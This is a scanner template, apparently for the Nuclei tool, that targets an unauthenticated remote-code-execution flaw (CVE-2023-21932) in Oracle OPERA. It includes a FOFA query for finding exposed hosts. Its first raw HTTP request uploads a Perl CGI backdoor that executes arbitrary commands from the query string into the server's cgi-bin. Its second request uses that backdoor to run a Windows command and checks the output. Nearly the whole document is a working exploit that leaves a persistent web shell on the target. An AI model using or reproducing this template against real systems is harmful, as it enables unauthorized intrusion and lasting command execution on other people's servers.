id: CVE-2023-21932-windows

info:
  name: Oracle OPERA 未授权 RCE
  author: wjlin0
  severity: critical
  description: |
    通过计算jndiname、username，未授权添加cgi脚本,进行rce
  tags: cve,rce,cgi,oracle,opera
  metadata:
    fofa-query: app="Oracle-OPERA"
  reference:
    - https://blog.assetnote.io/2023/04/30/rce-oracle-opera/
http:
  - raw:
      - |-
        POST /operajserv/webarchive/FileReceiver?filename=D:\MICROS\opera\operaias\cgi-bin\80088941a432b4458e492b7686a88da6.cgi&crc=588&trace=ON&copytoexpdir=1&jndiname=0c919bc95270f6921e102ab8ae52e497&username=f56ade9e2d01a95d782dc04e5fa4481309a563c219036e25&append=1 HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Length: 588
        Content-Type: multipart/form-data; boundary=------------------------e58fd172ced7d9dc
        Connection: close

        #!\ORA\MWFR\11gappr2\perl\bin\perl.exe

        use strict;

        print "Cache-Control: no-cache\n";
        print "Content-type: text/html\n\n";

        my $req = $ENV{QUERY_STRING};
          chomp ($req);
          $req =~ s/%20/ /g; 
          $req =~ s/%3b/;/g;

        print "<html><body>";

        print '<!-- Simple CGI backdoor by DK (http://michaeldaw.org) -->';

          if (!$req) {
            print "Usage: http://target.com/perlcmd.cgi?cat /etc/passwd";
          }
          else {
            print "Executing: $req";
          }

          print "<pre>";
          my @cmd = `$req`;
          print "</pre>";

          foreach my $line (@cmd) {
            print $line . "<br/>";
          }

        print "</body></html>";
      
      - |-
        GET /operabin/80088941a432b4458e492b7686a88da6.cgi?type%20C:\Windows\win.ini HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body_2
        words:
          - '[files]'
          - 'Executing: type C:\Windows\win.ini'
        condition: and
# digest: 490a0046304402202a78e5eb0da7427123dd092d0f4c08c2bd08c09d233336277ccb9bc0c5f515e402205aed76fcb7e9ff307279b9ff0249fa56a4cab3ed326a3c869bff1abba26b8f3d:9d8cf424f0e932381bf27cf1e926b867